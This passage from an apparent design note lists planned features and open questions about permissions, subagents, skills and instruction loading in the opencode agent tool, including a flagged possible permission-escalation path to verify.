- **Token-budget visibility** per surface (rules N tokens, skills manifest M tokens, tool descriptions K tokens).
- **Path-scoped edit permissions** using globs the editor already understands.

## 5.4 Open questions -- verify against the opencode source before committing

1. Is `permission` **intersected** between a parent agent and its subagent, or replaced? (Docs silent; security-
   critical.)
2. Exact `task` tool schema -- does it take a prompt, a description, a context handoff? Does the child session
   inherit the parent's rules/skills registry?
3. Whether nested `AGENTS.md` auto-discovery on `read` is real [SECONDARY] and how de-duplication is scoped
   (per turn? per session?).
4. Ordering when global + project + multiple `instructions` globs all match -- is it stable?
5. Whether `allowed-tools` from Anthropic's skill spec is honoured or ignored.
6. What happens on a skill/agent **name collision** across scopes -- override, error, or both loaded?
7. Whether `steps` is per-agent-invocation or per-session.
8. Whether a command's `agent:` field can escalate permissions beyond the currently-active agent (it looks like it
   can -- `/deploy` with `agent: build` while the user is in `plan` mode would be an escape hatch).
